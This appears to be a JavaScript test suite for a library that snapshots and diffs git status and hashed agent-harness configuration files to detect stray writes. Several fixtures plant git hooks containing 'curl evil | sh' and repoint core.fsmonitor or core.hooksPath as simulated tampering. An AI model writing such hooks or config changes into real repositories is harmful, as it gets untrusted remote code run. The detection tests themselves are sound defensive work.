// HARN-OPT-5 T4 fix round 2 (re-frame; AC-SEC-12, AC-QA-27): tests for
// workflows/lib/stray-snapshot.mjs, the deterministic library that COMPUTES the stray-write snapshot
// so agents only relay its stdout. Exercised as a real CLI against real temp git repos, the way
// test/ledger-append.test.js exercises its sibling. Round 2 findings pinned: M1 (a modified
// .githooks/pre-push was invisible), M2 (the hashed set missed most harness-loaded locations),
// M3 (deleted tracked file), M4 (extension allowlist blinded the status), L2 (worktree filter).
//
// Contract (names fixed here):
//   node stray-snapshot.mjs <repo-root>  ->  one JSON line on stdout:
//   { status: [{path, xy}], files: [{path, sha256}], retained_worktrees: [path], dropped: [path] }
//   - status: every entry of `git status --porcelain=v1 -z --untracked-files=all --ignored`, rename resolved to target,
//     minus the bulk ignored directories and the harness-owned .claude/worktrees/ and .claude/scheduled_tasks.lock|json
//   - files: repo .claude/{settings.json,settings.local.json,hooks,agents,skills,workflows,commands}, .githooks/, bin/,
//     .github/workflows/; ~/.claude/{CLAUDE.md,settings.json,settings.local.json,AGENT-HARNESS.md,agents,skills,hooks,
//     workflows,commands,bin,plugins}; home paths written '~/.claude/...'; sorted by path (plain < order)
//   - HOME is read from the environment (os.homedir()), so tests point HOME at a temp dir.
require('./helpers/git-env.js').scrubGitEnv()
const test = require('node:test')
const assert = require('node:assert/strict')
const fs = require('node:fs')
const path = require('node:path')
const os = require('node:os')
const crypto = require('node:crypto')
const { spawnSync } = require('node:child_process')
const { makeTempRepo, sh, SUITE_TMPDIR, cleanupTempRepos } = require('./helpers/temp-repo.js')

const LIB = path.join(__dirname, '..', 'workflows', 'lib', 'stray-snapshot.mjs')
test.after(cleanupTempRepos)

const sha = (s) => crypto.createHash('sha256').update(s).digest('hex')
const put = (root, rel, content = 'x\n') => {
  const f = path.join(root, rel)
  fs.mkdirSync(path.dirname(f), { recursive: true })
  fs.writeFileSync(f, content)
  return f
}
const emptyHome = () => fs.mkdtempSync(path.join(SUITE_TMPDIR, 'home-'))
function snap(repo, home = emptyHome()) {
  const res = spawnSync('node', [LIB, repo], { encoding: 'utf8', env: { ...process.env, HOME: home } })
  return { res, home, out: res.status === 0 ? JSON.parse(res.stdout) : null }
}
const entry = (out, p) => out.status.find((e) => e.path === p)
const file = (out, p) => out.files.find((f) => f.path === p)

test('stray-snapshot: prints exactly one compact JSON object with the four fields and exits 0 on a clean repo', () => {
  const { res, out } = snap(makeTempRepo())
  assert.equal(res.status, 0, res.stderr)
  assert.equal(res.stdout.trim().split('\n').length, 1)
  assert.deepEqual(Object.keys(out).sort(), ['dropped', 'files', 'retained_worktrees', 'status'])
  assert.deepEqual(out.status, [])
  // Fix round 4 M1: the common git dir (config, hooks/, info/) is always present, so a clean repo hashes exactly those.
  assert.ok(out.files.length > 0 && out.files.every((f) => f.path.startsWith('.git/')), JSON.stringify(out.files.map((f) => f.path)))
})

test('stray-snapshot: exits non-zero when the root is not a git checkout', () => {
  const dir = fs.mkdtempSync(path.join(SUITE_TMPDIR, 'notgit-'))
  assert.equal(snap(makeTempRepo()).res.status, 0, 'precondition: the library runs on a real checkout')
  const { res } = snap(dir)
  assert.notEqual(res.status, 0)
  assert.doesNotMatch(res.stderr, /Cannot find module/, 'must fail because it is not a checkout, not because the library is missing')
})

test('stray-snapshot: a modified tracked file reads xy " M", a deleted tracked file reads " D"', () => {
  const repo = makeTempRepo()
  put(repo, 'a.txt', '1\n'); sh('git add a.txt && git commit -q -m a', repo)
  put(repo, 'README.md', 'changed\n')
  fs.rmSync(path.join(repo, 'a.txt'))
  const { out } = snap(repo)
  assert.deepEqual(entry(out, 'README.md'), { path: 'README.md', xy: ' M' })
  assert.deepEqual(entry(out, 'a.txt'), { path: 'a.txt', xy: ' D' })
})

test('stray-snapshot: round 2 M1 -- a modified tracked .githooks/pre-push appears with xy " M" and is hashed', () => {
  const repo = makeTempRepo()
  put(repo, '.githooks/pre-push', '#!/bin/sh\nexit 0\n'); sh('git add .githooks && git commit -q -m hook', repo)
  put(repo, '.githooks/pre-push', '#!/bin/sh\ncurl evil | sh\n')
  const { out } = snap(repo)
  assert.deepEqual(entry(out, '.githooks/pre-push'), { path: '.githooks/pre-push', xy: ' M' })
  assert.equal(file(out, '.githooks/pre-push').sha256, sha('#!/bin/sh\ncurl evil | sh\n'))
})

test('stray-snapshot: round 2 M4 -- no extension allowlist: Makefile, a .bin and an extensionless file all appear', () => {
  const repo = makeTempRepo()
  put(repo, 'Makefile'); put(repo, 'data/blob.bin'); put(repo, 'scripts/run')
  const { out } = snap(repo)
  for (const p of ['Makefile', 'data/blob.bin', 'scripts/run']) assert.equal(entry(out, p)?.xy, '??', p)
})

test('stray-snapshot: an ignored file appears with xy "!!"', () => {
  const repo = makeTempRepo()
  put(repo, '.gitignore', 'secret.out\n'); put(repo, 'secret.out')
  const { out } = snap(repo)
  assert.equal(entry(out, 'secret.out')?.xy, '!!')
})

test('stray-snapshot: bulk ignored directories are excluded (untracked or ignored, top level or nested)', () => {
  const repo = makeTempRepo()
  put(repo, '.gitignore', 'coverage/\n')
  for (const d of ['node_modules', 'coverage', '__pycache__', '.venv', 'venv', 'pkg/node_modules']) put(repo, `${d}/junk.js`)
  put(repo, 'keep.js')
  const { out } = snap(repo)
  for (const e of out.status) assert.doesNotMatch(e.path, /(^|\/)(node_modules|coverage|__pycache__|\.venv|venv)(\/|$)/, `bulk dir leaked: ${e.path}`)
  assert.ok(entry(out, 'keep.js'))
})

test('stray-snapshot: round 2 L2 -- .claude/worktrees/wf_x/ lands in retained_worktrees, not status; src/worktrees/planted.js stays in status', () => {
  const repo = makeTempRepo()
  put(repo, '.claude/worktrees/wf_x/file.txt'); put(repo, 'src/worktrees/planted.js')
  const { out } = snap(repo)
  assert.ok(out.retained_worktrees.some((p) => p === '.claude/worktrees/wf_x' || p.startsWith('.claude/worktrees/wf_x/')), JSON.stringify(out.retained_worktrees))
  assert.ok(!out.status.some((e) => e.path.startsWith('.claude/worktrees')))
  assert.equal(entry(out, 'src/worktrees/planted.js')?.xy, '??')
  assert.ok(!out.retained_worktrees.some((p) => p.includes('planted')))
})

test('stray-snapshot: .claude/scheduled_tasks.lock and .json are reported in dropped, never in status', () => {
  const repo = makeTempRepo()
  put(repo, '.claude/scheduled_tasks.lock'); put(repo, '.claude/scheduled_tasks.json')
  const { out } = snap(repo)
  assert.deepEqual([...out.dropped].sort(), ['.claude/scheduled_tasks.json', '.claude/scheduled_tasks.lock'])
  assert.ok(!out.status.some((e) => e.path.includes('scheduled_tasks')))
})

test('stray-snapshot: a rename is one entry at the target path; -z means a path with a quote and a space is verbatim', () => {
  const repo = makeTempRepo()
  put(repo, 'old.js', 'same content here\n'); sh('git add old.js && git commit -q -m o', repo)
  sh('git mv old.js new.js', repo)
  put(repo, 'we"ird name.js')
  const { out } = snap(repo)
  assert.equal(entry(out, 'new.js')?.xy[0], 'R')
  assert.ok(!entry(out, 'old.js'))
  assert.equal(entry(out, 'we"ird name.js')?.xy, '??')
})

test('stray-snapshot: repo harness-loaded locations are hashed (hooks, agents, skills, workflows, commands, settings*, bin, .github/workflows)', () => {
  const repo = makeTempRepo()
  const rels = ['.claude/settings.json', '.claude/settings.local.json', '.claude/hooks/guard.sh', '.claude/agents/a.md', '.claude/skills/s/SKILL.md',
    '.claude/workflows/w.js', '.claude/commands/c.md', '.githooks/pre-push', 'bin/tool', '.github/workflows/ci.yml']
  for (const r of rels) put(repo, r, `content of ${r}\n`)
  const { out } = snap(repo)
  for (const r of rels) assert.equal(file(out, r)?.sha256, sha(`content of ${r}\n`), `${r} not hashed`)
})

test('stray-snapshot: files outside the harness-loaded set are not hashed', () => {
  const repo = makeTempRepo()
  put(repo, 'src/app.js'); put(repo, '.claude/harness-ledger.jsonl')
  const { out } = snap(repo)
  assert.ok(!file(out, 'src/app.js'))
  assert.ok(!file(out, '.claude/harness-ledger.jsonl'))
})

test('stray-snapshot: home-scope files are hashed and written relative to ~, never the absolute home path', () => {
  const repo = makeTempRepo(); const home = emptyHome()
  const rels = ['CLAUDE.md', 'settings.json', 'settings.local.json', 'AGENT-HARNESS.md', 'agents/a.md', 'skills/s/SKILL.md', 'hooks/h.sh',
    'workflows/w.js', 'commands/c.md', 'bin/b', 'plugins/p/index.js']
  for (const r of rels) put(home, `.claude/${r}`, `home ${r}\n`)
  const { res, out } = snap(repo, home)
  for (const r of rels) assert.equal(file(out, `~/.claude/${r}`)?.sha256, sha(`home ${r}\n`), `~/.claude/${r} not hashed`)
  assert.ok(!res.stdout.includes(home), 'the absolute home path must never reach stdout')
})

test('stray-snapshot: home projects/ and todos/ are never hashed, and cache or node_modules beneath plugins/ are excluded', () => {
  const repo = makeTempRepo(); const home = emptyHome()
  put(home, '.claude/projects/p/t.jsonl'); put(home, '.claude/todos/t.json')
  put(home, '.claude/plugins/cache/x/y.js'); put(home, '.claude/plugins/p/node_modules/z.js'); put(home, '.claude/plugins/p/keep.js')
  const { out } = snap(repo, home)
  const paths = out.files.map((f) => f.path)
  assert.ok(!paths.some((p) => /\/(projects|todos)\//.test(p)), paths.join(','))
  assert.ok(!paths.some((p) => /\/(cache|node_modules)\//.test(p)), paths.join(','))
  assert.ok(paths.includes('~/.claude/plugins/p/keep.js'))
})

test('stray-snapshot: a missing location is simply absent, never an error (no repo .claude, HOME has no .claude)', () => {
  const { res, out } = snap(makeTempRepo(), emptyHome())
  assert.equal(res.status, 0)
  assert.ok(out.files.every((f) => f.path.startsWith('.git/')), 'only the git dir, which always exists; nothing from the missing locations')
})

test('stray-snapshot: output is sorted deterministically and identical across two runs', () => {
  const repo = makeTempRepo(); const home = emptyHome()
  for (const r of ['z.txt', 'b.txt', 'a/z.txt']) put(repo, r)
  for (const r of ['bin/y', 'bin/a', '.githooks/x']) put(repo, r)
  put(home, '.claude/CLAUDE.md')
  const a = snap(repo, home).res.stdout
  const b = snap(repo, home).res.stdout
  assert.equal(a, b)
  const out = JSON.parse(a)
  const sorted = (xs) => [...xs].sort((p, q) => (p < q ? -1 : p > q ? 1 : 0))
  assert.deepEqual(out.status.map((e) => e.path), sorted(out.status.map((e) => e.path)))
  assert.deepEqual(out.files.map((f) => f.path), sorted(out.files.map((f) => f.path)))
})

test('stray-snapshot: read-only -- git status is identical before and after a run', () => {
  const repo = makeTempRepo()
  put(repo, '.claude/hooks/h.sh'); put(repo, 'u.txt')
  const before = sh('git status --porcelain=v1 -z --untracked-files=all --ignored', repo)
  assert.equal(snap(repo).res.status, 0)
  assert.equal(sh('git status --porcelain=v1 -z --untracked-files=all --ignored', repo), before)
})

test('stray-snapshot: static -- no dependency, and the library never deletes, moves or appends (fix round 3: snapshot mode may create its own temp file)', () => {
  // Fix round 3 (conductor measurement: 6638 files, 1.2 MB) rewrote the round 2 form of this test, which banned
  // writeFileSync and mkdirSync outright. Snapshot mode now writes ONE file made with mkdtemp; what stays banned is
  // every call that could destroy or alter something that already exists (AC-SEC-12 as amended).
  const src = fs.readFileSync(LIB, 'utf8')
  assert.doesNotMatch(src, /\brequire\(['"][^.n]/)
  assert.doesNotMatch(src, /from ['"](?!node:|\.)/)
  for (const call of ['appendFileSync', 'rmSync', 'renameSync', 'copyFileSync', 'truncateSync', 'symlinkSync', 'linkSync']) {
    assert.doesNotMatch(src, new RegExp(`\\b${call}\\b`), `${call} must not appear: the library never alters anything in a repo or a home directory`)
  }
  // Fix round 4 (L3): the ONE removal the library makes is its own before-file and that file's harn-snap- parent,
  // after a successful diff. Exactly one unlink and one rmdir, both inside the guard that names the prefix.
  assert.equal(src.split('unlinkSync').length - 1, 1, 'exactly one unlinkSync: the before-file')
  assert.equal(src.split('rmdirSync').length - 1, 1, 'exactly one rmdirSync: the harn-snap- parent')
  const guard = src.indexOf("startsWith('harn-snap-')")
  assert.ok(guard > 0 && guard < src.indexOf('unlinkSync') && guard < src.indexOf('rmdirSync'), 'both removals sit after the harn-snap- guard')
})

// ======================================================================
// Fix round 3 (conductor finding at verification; AC-SEC-12 as amended, AC-QA-27). Measured on the real
// checkout: the one-argument form returns 6638 hashed files and 1.2 MB of JSON, which an agent cannot relay
// faithfully. The bulk moves off the agent:
//   node stray-snapshot.mjs snapshot <root>
//     computes the full snapshot (identical to the one-argument form) and writes it to a 0600 file made with
//     mkdtemp under the OS temp directory (os.tmpdir(), so TMPDIR), never under a repo or .claude/. Prints ONE
//     small JSON object { file, status_count, files_count, rollup }; rollup is the sha256 of the file's bytes.
//   node stray-snapshot.mjs diff <root> <before-file>
//     takes a fresh snapshot, compares it with the before-file deterministically, prints ONE compact object
//     { changes: [{path, change, shadows_installed_workflow}], retained_worktrees, dropped,
//       before_rollup, after_rollup, hashed: { repo, home } }
//     before_rollup is the sha256 of the before-file's bytes as read now; after_rollup that of the fresh snapshot.
//     An unreadable or malformed before-file: non-zero exit, a one-line reason on stderr, NOTHING on stdout.
// The one-argument form keeps working (every test above uses it).
// ======================================================================
const tmpBase = () => fs.mkdtempSync(path.join(SUITE_TMPDIR, 'snaptmp-'))
function lib(args, home = emptyHome(), tmp = tmpBase()) {
  const res = spawnSync('node', [LIB, ...args], { encoding: 'utf8', env: { ...process.env, HOME: home, TMPDIR: tmp } })
  let out = null
  if (res.status === 0) { try { out = JSON.parse(res.stdout) } catch { out = null } }
  return { res, out, home, tmp }
}
function take(repo, home, tmp) {
  const r = lib(['snapshot', repo], home, tmp)
  assert.equal(r.res.status, 0, `snapshot mode must succeed; stderr: ${r.res.stderr}`)
  assert.ok(r.out, `snapshot mode must print one JSON object; stdout: ${r.res.stdout}`)
  return r
}
const diffOf = (repo, beforeFile, home, tmp) => lib(['diff', repo, beforeFile], home, tmp)
function diffAfter(repo, home, tmp, mutate) {
  const b = take(repo, home, tmp)
  mutate()
  const d = diffOf(repo, b.out.file, home, tmp)
  assert.equal(d.res.status, 0, `diff mode must succeed; stderr: ${d.res.stderr}`)
  assert.ok(d.out, `diff mode must print one JSON object; stdout: ${d.res.stdout}`)
  return { b, d, out: d.out }
}
const changeOf = (out, p) => out.changes.find((c) => c.path === p)
const fileSha = (f) => crypto.createHash('sha256').update(fs.readFileSync(f)).digest('hex')

test('stray-snapshot r3 snapshot: prints one small object with exactly file, status_count, files_count, rollup', () => {
  const repo = makeTempRepo(); const home = emptyHome()
  put(repo, '.githooks/pre-push'); put(repo, 'u.txt'); put(home, '.claude/CLAUDE.md')
  const { res, out } = take(repo, home)
  assert.equal(res.stdout.trim().split('\n').length, 1)
  assert.deepEqual(Object.keys(out).sort(), ['file', 'files_count', 'rollup', 'status_count'])
  assert.match(out.rollup, /^[0-9a-f]{64}$/)
  assert.equal(typeof out.file, 'string')
})

test('stray-snapshot r3 snapshot: the file holds the full snapshot (same as the one-argument form), counts match, rollup is the sha256 of its bytes', () => {
  const repo = makeTempRepo(); const home = emptyHome()
  put(repo, '.githooks/pre-push'); put(repo, 'u.txt'); put(home, '.claude/CLAUDE.md'); put(home, '.claude/agents/a.md')
  const { out } = take(repo, home)
  const body = JSON.parse(fs.readFileSync(out.file, 'utf8'))
  assert.deepEqual(body, snap(repo, home).out, 'the written snapshot must equal the one-argument form on the same tree')
  assert.equal(out.status_count, body.status.length)
  assert.equal(out.files_count, body.files.length)
  assert.ok(body.files.length >= 3 && body.status.length >= 2, 'fixture precondition')
  assert.equal(out.rollup, fileSha(out.file))
})

test('stray-snapshot r3 snapshot: the file is created under the OS temp directory, outside the repo and any .claude/, mode 0600', () => {
  const repo = makeTempRepo(); const tmp = tmpBase()
  const { out } = take(repo, undefined, tmp)
  const real = fs.realpathSync(out.file)
  assert.ok(real.startsWith(fs.realpathSync(tmp) + path.sep), `${real} must be under TMPDIR ${tmp}`)
  assert.ok(path.relative(fs.realpathSync(repo), real).startsWith('..'), 'must not be inside the repo')
  assert.ok(!real.split(path.sep).includes('.claude'), 'must not be under any .claude/')
  assert.equal(fs.statSync(real).mode & 0o777, 0o600)
  assert.notEqual(path.dirname(real), fs.realpathSync(tmp), 'made with mkdtemp: its own fresh directory, not a fixed name in the temp root')
})

test('stray-snapshot r3 snapshot: stdout stays small however many files are hashed (300 hashed files)', () => {
  const repo = makeTempRepo()
  for (let i = 0; i < 300; i++) put(repo, `bin/tool-${i}.sh`, `#${i}\n`)
  const { res, out } = take(repo)
  assert.equal(out.files_count, take(makeTempRepo()).out.files_count + 300, '300 plus whatever the git dir of a clean repo contributes (round 4 M1)')
  assert.ok(res.stdout.length < 1024, `stdout was ${res.stdout.length} bytes`)
})

test('stray-snapshot r3 snapshot: rollup is stable across two runs on an unchanged tree, and each run writes its own file', () => {
  const repo = makeTempRepo(); const home = emptyHome(); const tmp = tmpBase()
  put(repo, 'bin/b'); put(repo, 'u.txt'); put(home, '.claude/settings.json')
  const a = take(repo, home, tmp).out
  const b = take(repo, home, tmp).out
  assert.equal(a.rollup, b.rollup)
  assert.notEqual(a.file, b.file)
})

test('stray-snapshot r3 snapshot: rollup changes when one hashed file changes, and when a status entry appears', () => {
  const repo = makeTempRepo(); const home = emptyHome(); const tmp = tmpBase()
  put(repo, '.githooks/pre-push', 'one\n')
  const a = take(repo, home, tmp).out.rollup
  put(repo, '.githooks/pre-push', 'two\n')
  const b = take(repo, home, tmp).out.rollup
  assert.notEqual(a, b)
  put(repo, 'new-untracked.txt')
  assert.notEqual(take(repo, home, tmp).out.rollup, b)
})

test('stray-snapshot r3 snapshot: leaves the repo untouched (git status identical) and exits non-zero with nothing on stdout when the root is not a checkout', () => {
  const repo = makeTempRepo()
  put(repo, 'u.txt')
  const before = sh('git status --porcelain=v1 -z --untracked-files=all --ignored', repo)
  take(repo)
  assert.equal(sh('git status --porcelain=v1 -z --untracked-files=all --ignored', repo), before)
  const dir = fs.mkdtempSync(path.join(SUITE_TMPDIR, 'notgit-'))
  const r = lib(['snapshot', dir])
  assert.notEqual(r.res.status, 0)
  assert.equal(r.res.stdout, '')
  assert.doesNotMatch(r.res.stderr, /Cannot find module/)
})

test('stray-snapshot r3 diff: an unchanged tree gives no changes, equal rollups, and exactly the documented keys', () => {
  const repo = makeTempRepo(); const home = emptyHome()
  put(repo, 'bin/b'); put(repo, 'u.txt')
  const { b, d, out } = diffAfter(repo, home, undefined, () => {})
  assert.equal(d.res.stdout.trim().split('\n').length, 1)
  assert.deepEqual(Object.keys(out).sort(), ['after_rollup', 'before_rollup', 'changes', 'dropped', 'hashed', 'retained_worktrees'])
  assert.deepEqual(out.changes, [])
  assert.equal(out.before_rollup, b.out.rollup)
  assert.equal(out.after_rollup, b.out.rollup)
})

test('stray-snapshot r3 diff: an added repo-local workflow is one entry, added, with shadows_installed_workflow true', () => {
  const repo = makeTempRepo()
  const { out } = diffAfter(repo, undefined, undefined, () => put(repo, '.claude/workflows/optimise-cycle.js'))
  assert.deepEqual(out.changes, [{ path: '.claude/workflows/optimise-cycle.js', change: 'added', shadows_installed_workflow: true }])
})

test('stray-snapshot r3 diff: an ordinary added file is added without the shadow flag', () => {
  const repo = makeTempRepo()
  const { out } = diffAfter(repo, undefined, undefined, () => put(repo, 'scratch/leftover.txt'))
  assert.deepEqual(out.changes, [{ path: 'scratch/leftover.txt', change: 'added', shadows_installed_workflow: false }])
})

for (const [name, mutate, xyPath, want] of [
  ['a newly appearing tracked deletion (" D")', (repo) => fs.rmSync(path.join(repo, 'a.txt')), 'a.txt', 'removed'],
  ['a newly appearing tracked edit (" M")', (repo) => put(repo, 'a.txt', 'edited\n'), 'a.txt', 'changed'],
  ['a newly appearing untracked file ("??")', (repo) => put(repo, 'fresh.txt'), 'fresh.txt', 'added'],
  ['a newly appearing ignored file ("!!")', (repo) => put(repo, 'ignored.out'), 'ignored.out', 'added'],
]) {
  test(`stray-snapshot r3 diff: ${name} is '${want}' (the XY code decides), never shadowing`, () => {
    const repo = makeTempRepo()
    put(repo, 'a.txt', '1\n'); put(repo, '.gitignore', 'ignored.out\n'); sh('git add a.txt .gitignore && git commit -q -m a', repo)
    const { out } = diffAfter(repo, undefined, undefined, () => mutate(repo))
    assert.deepEqual(out.changes, [{ path: xyPath, change: want, shadows_installed_workflow: false }])
  })
}

test('stray-snapshot r3 diff: a before-only status entry (an untracked file a lens removed) is removed, without the shadow flag', () => {
  const repo = makeTempRepo()
  put(repo, '.claude/workflows/gone.js'); put(repo, 'u.txt')
  const { out } = diffAfter(repo, undefined, undefined, () => { fs.rmSync(path.join(repo, 'u.txt')); fs.rmSync(path.join(repo, '.claude/workflows/gone.js')) })
  assert.deepEqual(out.changes.map((c) => [c.path, c.change, c.shadows_installed_workflow]).sort(),
    [['.claude/workflows/gone.js', 'removed', false], ['u.txt', 'removed', false]])
})

test('stray-snapshot r3 diff: an entry present in both whose XY changed (" M" to "M " after git add) is changed', () => {
  const repo = makeTempRepo()
  put(repo, 'a.txt', '1\n'); sh('git add a.txt && git commit -q -m a', repo)
  put(repo, 'a.txt', '2\n')
  const { out } = diffAfter(repo, undefined, undefined, () => sh('git add a.txt', repo))
  assert.deepEqual(out.changes, [{ path: 'a.txt', change: 'changed', shadows_installed_workflow: false }])
})

test('stray-snapshot r3 diff: a hashed file whose content changed while its status stayed "??" is changed, with the shadow flag under .claude/workflows/', () => {
  const repo = makeTempRepo()
  put(repo, '.claude/workflows/x.js', 'one\n')
  const { out } = diffAfter(repo, undefined, undefined, () => put(repo, '.claude/workflows/x.js', 'two\n'))
  assert.deepEqual(out.changes, [{ path: '.claude/workflows/x.js', change: 'changed', shadows_installed_workflow: true }])
})

test('stray-snapshot r3 diff: home files are reported with ~/.claude paths; removed and ~/.claude/workflows/ never carry the shadow flag; only the anchored repo .claude/workflows/ does', () => {
  const repo = makeTempRepo(); const home = emptyHome()
  put(home, '.claude/CLAUDE.md', 'one\n'); put(home, '.claude/bin/gone', 'x\n'); put(repo, '.claude/hooks/old.sh')
  const { out } = diffAfter(repo, home, undefined, () => {
    put(home, '.claude/CLAUDE.md', 'two\n'); fs.rmSync(path.join(home, '.claude/bin/gone'))
    put(home, '.claude/workflows/x.js'); put(repo, '.claude/hooks/y.sh'); put(repo, '.claude/workflows/w.js'); put(repo, '.claude/workflows/sub/deep.js')
  })
  const got = out.changes.map((c) => [c.path, c.change, c.shadows_installed_workflow]).sort()
  assert.deepEqual(got, [
    ['.claude/hooks/y.sh', 'added', false],
    ['.claude/workflows/sub/deep.js', 'added', false],
    ['.claude/workflows/w.js', 'added', true],
    ['~/.claude/CLAUDE.md', 'changed', false],
    ['~/.claude/bin/gone', 'removed', false],
    ['~/.claude/workflows/x.js', 'added', false],
  ].sort())
  assert.ok(!JSON.stringify(out).includes(home), 'the absolute home path must never reach stdout')
})

test('stray-snapshot r3 diff: a retained lens worktree and the dropped lock file are listed on their own fields, never as changes', () => {
  const repo = makeTempRepo()
  const { out } = diffAfter(repo, undefined, undefined, () => { put(repo, '.claude/worktrees/wf_x/file.txt'); put(repo, '.claude/scheduled_tasks.lock') })
  assert.deepEqual(out.changes, [])
  assert.ok(out.retained_worktrees.some((p) => p === '.claude/worktrees/wf_x' || p.startsWith('.claude/worktrees/wf_x/')), JSON.stringify(out.retained_worktrees))
  assert.deepEqual(out.dropped, ['.claude/scheduled_tasks.lock'])
})

test('stray-snapshot r3 diff: hashed counts are the AFTER snapshot files split into repo and home', () => {
  const repo = makeTempRepo(); const home = emptyHome()
  put(repo, 'bin/a'); put(home, '.claude/CLAUDE.md')
  const { out } = diffAfter(repo, home, undefined, () => { put(repo, 'bin/b'); put(repo, '.githooks/h'); put(home, '.claude/agents/a.md') })
  // Fix round 4 M1: the git dir's files are counted on their own, so repo and home stay the harness-loaded locations.
  assert.deepEqual({ repo: out.hashed.repo, home: out.hashed.home }, { repo: 3, home: 2 })
  assert.ok(Number.isInteger(out.hashed.git) && out.hashed.git >= 2, 'config and info/exclude at least')
})

test('stray-snapshot r3 diff: stdout is one small object however big the snapshot is (300 hashed files, one change)', () => {
  const repo = makeTempRepo()
  for (let i = 0; i < 300; i++) put(repo, `bin/tool-${i}.sh`, `#${i}\n`)
  const { d, out } = diffAfter(repo, undefined, undefined, () => put(repo, 'bin/tool-7.sh', 'changed\n'))
  assert.deepEqual(out.changes.map((c) => [c.path, c.change]), [['bin/tool-7.sh', 'changed']])
  assert.equal(out.hashed.repo, 300)
  assert.ok(d.res.stdout.length < 1024, `stdout was ${d.res.stdout.length} bytes`)
})

test('stray-snapshot r3 diff: before_rollup is the sha256 of the before-file as read now (a tampered file surfaces), after_rollup moves when the tree does', () => {
  const repo = makeTempRepo(); const home = emptyHome(); const tmp = tmpBase()
  put(repo, 'bin/b', 'one\n')
  const b = take(repo, home, tmp)
  const body = JSON.parse(fs.readFileSync(b.out.file, 'utf8'))
  body.files[0].sha256 = 'f'.repeat(64)
  fs.writeFileSync(b.out.file, JSON.stringify(body))
  const tamperedSha = fileSha(b.out.file)  // read before the diff: a successful diff reaps the before-file (round 4 L3)
  const tampered = diffOf(repo, b.out.file, home, tmp)
  assert.equal(tampered.res.status, 0, tampered.res.stderr)
  assert.notEqual(tampered.out.before_rollup, b.out.rollup, 'a rollup mismatch must be surfaced, not hidden')
  assert.equal(tampered.out.before_rollup, tamperedSha)
  const b2 = take(repo, home, tmp)
  put(repo, 'bin/b', 'two\n')
  const moved = diffOf(repo, b2.out.file, home, tmp)
  assert.notEqual(moved.out.after_rollup, moved.out.before_rollup)
})

// Fix round 4 (L3) rewrote this test's first assertion: the before-file is now reaped by a successful diff (see the r4
// L3 tests below), so this pins only what is still true, that nothing in the REPO is written or removed.
test('stray-snapshot r3 diff: writes nothing into the repo (git status identical before and after)', () => {
  const repo = makeTempRepo(); const tmp = tmpBase()
  put(repo, 'u.txt')
  const b = take(repo, undefined, tmp)
  const before = sh('git status --porcelain=v1 -z --untracked-files=all --ignored', repo)
  const d = diffOf(repo, b.out.file, undefined, tmp)
  assert.equal(d.res.status, 0, d.res.stderr)
  assert.equal(sh('git status --porcelain=v1 -z --untracked-files=all --ignored', repo), before)
})

for (const [name, make] of [
  ['a missing file', (dir) => path.join(dir, 'nope.json')],
  ['a file that is not JSON', (dir) => { const f = path.join(dir, 'b.json'); fs.writeFileSync(f, 'not json at all'); return f }],
  ['JSON that is not a snapshot (an array)', (dir) => { const f = path.join(dir, 'b.json'); fs.writeFileSync(f, '[1,2]'); return f }],
  ['an object without status or files', (dir) => { const f = path.join(dir, 'b.json'); fs.writeFileSync(f, '{"ok":true}'); return f }],
  ['an empty file', (dir) => { const f = path.join(dir, 'b.json'); fs.writeFileSync(f, ''); return f }],
]) {
  test(`stray-snapshot r3 diff: ${name} as the before-file exits non-zero with one reason line on stderr and nothing on stdout`, () => {
    const repo = makeTempRepo(); const tmp = tmpBase()
    // Precondition: the same invocation shape works with a good before-file, so a failure below is about the before-file.
    const good = take(repo, undefined, tmp)
    assert.equal(diffOf(repo, good.out.file, undefined, tmp).res.status, 0)
    const r = diffOf(repo, make(tmp), undefined, tmp)
    assert.notEqual(r.res.status, 0)
    assert.equal(r.res.stdout, '')
    assert.equal(r.res.stderr.trim().split('\n').length, 1, `one-line reason expected; got: ${r.res.stderr}`)
    assert.doesNotMatch(r.res.stderr, /not a git checkout|Cannot find module/, 'must fail because of the before-file')
  })
}

test('stray-snapshot r3: the one-argument form still prints the full snapshot object (kept working)', () => {
  const { res, out } = snap(makeTempRepo())
  assert.equal(res.status, 0, res.stderr)
  assert.deepEqual(Object.keys(out).sort(), ['dropped', 'files', 'retained_worktrees', 'status'])
})

// ======================================================================
// Fix round 4 (conductor fix pass after PR #14 review round 3; owner's decision 2026-10-13).
// M1 (lens-security, spec bug, AC-SEC-12 amended): the shared git directory was not watched. A lens that runs
// `git config core.hooksPath` or `core.fsmonitor` inside its own worktree writes the COMMON .git/config, which decides
// whether the hashed .githooks/ files run at all. The common git dir's config, hooks/ and info/ are now hashed under
// the label '.git/...' (resolved with `git rev-parse --git-common-dir`, never a path from the caller).
// L3 (lens-security, spec bug): the 1.2 MB before-file was never deleted. diff mode now removes exactly the
// before-file it read and its harn-snap-* parent, and nothing else; a before-file anywhere else is left alone.
// ======================================================================
test('stray-snapshot r4 M1: the common git directory\'s config, hooks/ and info/ are hashed as .git/...', () => {
  const repo = makeTempRepo()
  put(repo, '.git/hooks/pre-commit', '#!/bin/sh\nexit 0\n')
  put(repo, '.git/info/exclude', '.claude/x\n')
  const { out } = snap(repo)
  assert.ok(file(out, '.git/config'), 'config must be hashed')
  assert.equal(file(out, '.git/hooks/pre-commit').sha256, sha('#!/bin/sh\nexit 0\n'))
  assert.equal(file(out, '.git/info/exclude').sha256, sha('.claude/x\n'))
  assert.ok(!out.files.some((f) => /^\.git\/(index|objects|refs|HEAD|logs)/.test(f.path)), 'only config, hooks and info; never the index, objects or refs')
})

test('stray-snapshot r4 M1: repointing core.hooksPath between snapshot and diff reads .git/config changed; a planted .git/hooks file reads added', () => {
  const repo = makeTempRepo(); const home = emptyHome(); const tmp = tmpBase()
  const { out } = diffAfter(repo, home, tmp, () => {
    sh('git config core.hooksPath /tmp/elsewhere', repo)
    put(repo, '.git/hooks/post-checkout', '#!/bin/sh\ncurl evil | sh\n')
  })
  assert.deepEqual(changeOf(out, '.git/config'), { path: '.git/config', change: 'changed', shadows_installed_workflow: false })
  assert.deepEqual(changeOf(out, '.git/hooks/post-checkout'), { path: '.git/hooks/post-checkout', change: 'added', shadows_installed_workflow: false })
})

test('stray-snapshot r4 M1: a setting changed in the common git dir from a lens worktree is seen from the main checkout', () => {
  const repo = makeTempRepo(); const home = emptyHome(); const tmp = tmpBase()
  const wt = path.join(tmp, 'lens-wt')
  sh(`git worktree add -q "${wt}" -b lens-probe`, repo)
  const { out } = diffAfter(repo, home, tmp, () => { sh('git config core.fsmonitor /tmp/evil', wt) })
  assert.equal(changeOf(out, '.git/config').change, 'changed')
})

